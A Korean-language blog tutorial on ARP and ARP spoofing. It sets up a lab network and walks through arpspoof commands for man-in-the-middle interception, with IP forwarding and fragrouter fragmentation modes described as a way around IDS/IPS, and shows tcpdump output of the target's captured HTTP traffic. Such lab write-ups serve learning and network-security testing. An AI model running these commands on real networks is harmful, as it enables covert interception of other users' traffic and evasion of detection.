---
title: ARP 스푸핑, arpspoof와 fragrouter 사용법 원리

toc: true
toc_sticky: true

categories:
  - devops

tags:
  - arp
  - arpspoof
  - fragrouter
  - arp 스푸핑
  - tcpdump
---
 
네트워크 보안 툴 arpspoof와 fragrouter 사용법 및 ARP 스푸핑 원리

{% raw %}


## 1. ARP (주소 결정 프로토콜)란?

### 1. 정의
ARP`(Address Resolution Protocol)`는 IP 네트워크에서 네트워크 계층의 IP 주소를 데이터 링크 계층의 MAC`(Media Access Control)` 주소로 변환하는 프로토콜입니다.  
이를 통해 로컬 네트워크에서 IP 패킷이 올바른 물리적 네트워크 장치로 전달될 수 있습니다.

### 2. 작동 원리
ARP는 다음과 같은 과정으로 작동합니다:

1. **ARP 요청 (Request)**
   - 송신 호스트가 목적지 호스트의 MAC 주소를 모를 때, ARP 요청 패킷을 브로드캐스트로 네트워크에 전송합니다.
   - 이 요청 패킷에는 송신 호스트의 IP 주소와 MAC 주소, 그리고 목적지 호스트의 IP 주소가 포함되어 있습니다.
2. **ARP 응답 (Reply)**
   - 네트워크에 있는 모든 호스트가 이 ARP 요청을 수신합니다.
   - 요청된 IP 주소를 가진 호스트는 자신의 MAC 주소를 포함한 ARP 응답 패킷을 송신 호스트에게 유니캐스트로 전송합니다.
3. **주소 매핑**
   - 송신 호스트는 ARP 응답을 수신하고, 해당 IP 주소와 MAC 주소의 매핑을 ARP 캐시(테이블)에 저장합니다.
   - 이후 동일한 IP 주소로의 통신이 발생할 때, ARP 캐시를 참조하여 MAC 주소를 빠르게 확인할 수 있습니다.

### 3. ARP 캐시
ARP 캐시는 IP 주소와 MAC 주소의 매핑을 일시적으로 저장하는 테이블입니다.  
이를 통해 같은 IP 주소에 대한 반복적인 ARP 요청을 방지하고, 네트워크 성능을 향상시킬 수 있습니다.   
그러나 ARP 캐시는 보통 일정 시간이 지나면 항목이 만료됩니다.

### 4. 보안 문제
ARP는 신뢰할 수 있는 프로토콜이 아니며, 다음과 같은 보안 문제를 가질 수 있습니다:

- **ARP 스푸핑 (Spoofing)**
  - 공격자가 가짜 ARP 응답을 네트워크에 전송하여, 자신을 다른 호스트로 위장하고 트래픽을 가로채거나 변조할 수 있습니다.
  
- **ARP 캐시 포이즈닝 (Cache Poisoning)**
  - 공격자가 ARP 캐시에 잘못된 IP-MAC 주소 매핑을 삽입하여, 네트워크 통신을 중단시키거나 트래픽을 리다이렉트할 수 있습니다.


## 2. arpspoof, fragrouter 도구 설치 및 기본 설명

### arpspoof 설치
`arpspoof`는 dsniff 패키지의 일부입니다. 설치하는 방법은 다음과 같습니다

> dsniff는 네트워크 보안 분석 및 테스트를 위해 설계된 다양한 도구들을 포함하는 패키지입니다.  
> 이 패키지는 네트워크 트래픽을 캡처하고 분석하며, 스니핑(sniffing)과 관련된 여러 가지 기능을 제공합니다.

- **Ubuntu/Debian**
```bash
sudo apt-get update
sudo apt-get install dsniff
```

### fragrouter 설치
`fragrouter`는 네트워크 트래픽을 조작하는 도구로, 다음과 같이 설치할 수 있습니다:

- **Ubuntu/Debian**
```bash
sudo apt-get update
sudo apt-get install fragrouter
```

## 3. ARP 스푸핑의 원리 및 arpspoof, fragrouter 도구의 역할

### ARP 스푸핑의 원리
ARP(주소 결정 프로토콜)는 IP 주소를 물리적 네트워크 주소(MAC 주소)로 매핑하는 프로토콜입니다.  
ARP 스푸핑은 공격자가 가짜 ARP 메시지를 네트워크에 보내 자신을 다른 호스트로 위장하여 트래픽을 가로채거나 변조하는 공격 방법

### arpspoof 도구의 역할
`arpspoof`는 ARP 스푸핑 공격을 수행하는 도구로, 네트워크에서 두 호스트 사이의 트래픽을 가로채기 위해 사용됩니다.  
예를 들어, 공격자는 arpspoof를 사용하여 게이트웨이와 타겟 호스트 간의 트래픽을 가로챌 수 있습니다.

> 가짜 ARP 응답 패킷을 생성하여 네트워크의 다른 호스트에게 보내고 이를 통해 공격자는 자신의 MAC 주소를 다른 호스트의 IP 주소에 매핑하여, 트래픽을 자신을 거쳐 가게 만듬

사용법:
```bash
sudo arpspoof -i [인터페이스] -t [타겟 IP] [게이트웨이 IP]
```

### fragrouter 도구의 역할
`fragrouter`는 네트워크 트래픽을 변조하거나 조각(fragment)화하여 IDS/IPS를 우회하는 등의 공격을 돕는 도구입니다.  
다양한 모드를 지원하며, 각 모드는 서로 다른 방법으로 트래픽을 변조합니다.

사용법:
```bash
sudo fragrouter -B1  # 가장 기본적인 모드
```

#### 모드 지원 
-	-B1: 기본 조각화 모드. 패킷을 8바이트 크기의 조각으로 나눕니다.
-	-B2: 패킷을 24바이트 크기의 조각으로 나눕니다.
-	-B3: 모든 패킷을 임의의 크기로 나눕니다.
-	-B4: 모든 패킷을 최대 크기로 나누어 재조립을 어렵게 합니다.


### IPv4 포워딩 설정
ARP 스푸핑을 성공적으로 수행하려면, 스푸핑 머신이 중간자(Man-in-the-Middle) 역할을 할 수 있도록 IPv4 포워딩을 활성화해야 함    

#### IPv4 포워딩 활성화 방법:
```bash
# 일시적으로 IPv4 포워딩 활성화
sudo sysctl -w net.ipv4.ip_forward=1

# 영구적으로 IPv4 포워딩 활성화
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

## 4. 테스트 예제: arpspoof 및 fragrouter 사용

### 가정된 네트워크 설정
- **호스트 머신 (타겟)**: 198.19.249.2
- **스푸핑 머신 (공격자)**: 198.19.249.3
- **게이트웨이**: 198.19.249.1

### arpspoof 사용 예제
호스트 머신의 트래픽을 가로채기 위해, 스푸핑 머신에서 다음 명령어를 실행   

```bash
# 198.19.249.2(타겟)에게 게이트웨이 198.19.249.1의 MAC 주소를 공격자의 MAC 주소로 속이는 ARP 패킷을 보냄
sudo arpspoof -i eth0 -t 198.19.249.2 198.19.249.1

# 동시에, 스푸핑 머신에서 게이트웨이에도 ARP 스푸핑을 수행
# 게이트웨이 198.19.249.1에게 호스트 머신 198.19.249.2의 MAC 주소를 공격자의 MAC 주소로 속이는 ARP 패킷을 보냄
sudo arpspoof -i eth0 -t 198.19.249.1 198.19.249.2
```

또는 단일 명령어로 양방향 스푸핑을 수행할 수 있음.

```bash
sudo arpspoof -i eth0 198.19.249.2 -r 198.19.249.1
```

> `-r` 옵션을 사용하면 arpspoof는 목표 IP 주소와 게이트웨이 IP 주소 간의 ARP 스푸핑을 동시에 수행할 수 있음.  
> 이는 네트워크에서 게이트웨이 역할을 하는 장치로부터 목표 호스트로 가는 모든 트래픽을 가로챌 수 있게 해줍니다.


### fragrouter 사용 예제
스푸핑 머신에서 네트워크 트래픽을 변조하기 위해 fragrouter를 설정합니다. 예를 들어, 모드 1로 설정하여 패킷을 조각화합니다:

```bash
sudo fragrouter -B1
```

이 명령어는 들어오는 패킷을 조각화하여 트래픽을 변조 및 전달 

- 패킷 수신: 네트워크 인터페이스에서 패킷을 수신합니다.
- 패킷 변조: 설정된 모드에 따라 패킷을 조각화하거나 변조합니다.
- 패킷 전달: 변조된 패킷을 목적지로 전달합니다.

--- 

## 5. tcpdump를 통한 덤프된 패킷을 보는 방법

### tcpdump 기본 설명
`tcpdump`는 네트워크 인터페이스를 통해 들어오고 나가는 패킷을 캡처하고 분석하는 도구입니다.

### tcpdump 설치
- **Ubuntu/Debian**:
  ```bash
  sudo apt-get install tcpdump
  ```

### tcpdump 사용법
패킷을 캡처하기 위해서는 다음 명령어를 사용합니다

```bash
sudo tcpdump -i eth0
```

### 테스트 

#### 스푸핑 머신 (공격자) 에서 패킷 캡쳐  

```bash
# 네트워크 인터페이스 확인 
$ sudo tcpdump -D
1.eth0 [Up, Running, Connected]
2.any (Pseudo-device that captures on all interfaces) [Up, Running]
3.lo [Up, Running, Loopback]
...

# 패킷 캡쳐 : host httpbin.org and tcp port 80
$ sudo tcpdump -i 1 -n host httpbin.org and tcp port 80
```

#### 호스트 머신 (타겟)에서 HTTP 호출 

```bash
$ curl httpbin.org/get
{
  "args": {},
  "headers": {
    "Accept": "*/*",
    "Host": "httpbin.org",
    "User-Agent": "curl/8.8.0",
    "X-Amzn-Trace-Id": "Root=1-667d27b9-1bc9fbf01717e5424f5d3ec1"
  },
  "origin": "124.49.100.52",
  "url": "http://httpbin.org/get"
}
```

#### 스푸핑 머신 (공격자) 에서 내용 확인 
```bash
$ sudo tcpdump -i 1 -n host httpbin.org and tcp port 80
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
08:55:23.564492 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [S], seq 3936188444, win 64240, options [mss 1460,sackOK,TS val 1312186693 ecr 0,nop,wscale 7], length 0
08:55:23.564601 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [S], seq 3936188444, win 64240, options [mss 1460,sackOK,TS val 1312186693 ecr 0,nop,wscale 7], length 0
08:55:23.822969 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [.], ack 3173450946, win 502, options [nop,nop,TS val 1312186951 ecr 2806340177], length 0
08:55:23.823057 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [.], ack 1, win 502, options [nop,nop,TS val 1312186951 ecr 2806340177], length 0
08:55:23.823188 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [P.], seq 0:77, ack 1, win 502, options [nop,nop,TS val 1312186951 ecr 2806340177], length 77: HTTP: GET /get HTTP/1.1
08:55:23.823199 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [P.], seq 0:77, ack 1, win 502, options [nop,nop,TS val 1312186951 ecr 2806340177], length 77: HTTP: GET /get HTTP/1.1
08:55:24.027301 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [.], ack 484, win 499, options [nop,nop,TS val 1312187155 ecr 2806340382], length 0
08:55:24.027380 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [.], ack 484, win 499, options [nop,nop,TS val 1312187155 ecr 2806340382], length 0
08:55:24.027960 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [F.], seq 77, ack 484, win 501, options [nop,nop,TS val 1312187156 ecr 2806340382], length 0
08:55:24.027978 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [F.], seq 77, ack 484, win 501, options [nop,nop,TS val 1312187156 ecr 2806340382], length 0
08:55:24.240286 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [.], ack 485, win 501, options [nop,nop,TS val 1312187369 ecr 2806340595], length 0
08:55:24.240313 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [.], ack 485, win 501, options [nop,nop,TS val 1312187369 ecr 2806340595], length 0
```

#### capture.pcap 파일로 저장 후, Wireshark 툴로 확인

```bash
$ sudo tcpdump -i 1 -n host httpbin.org and tcp port 80 -w capture.pcap
```

![](/images/2024-06-27-18-08-23.png)

---


## 기타 

### Docker 환경에서의 테스트 이슈 
- Docker의 기본 브리지 네트워크 설정에서 외부 네트워크와의 통신이 올바르게 설정되지 않았을 수 있습니다.
  - Docker 브리지 네트워크에서 외부 네트워크로 나가는 패킷은 NAT를 통해 변환되는데, 이 과정에서 문제가 발생할 수 있습니다.
- docker macvlan 네트워크 모드에서는 테스트 가능 : [Docker 네트워크 - Macvlan](/devops/docker-macvlan/){:target="_blank"}

{% endraw %}
 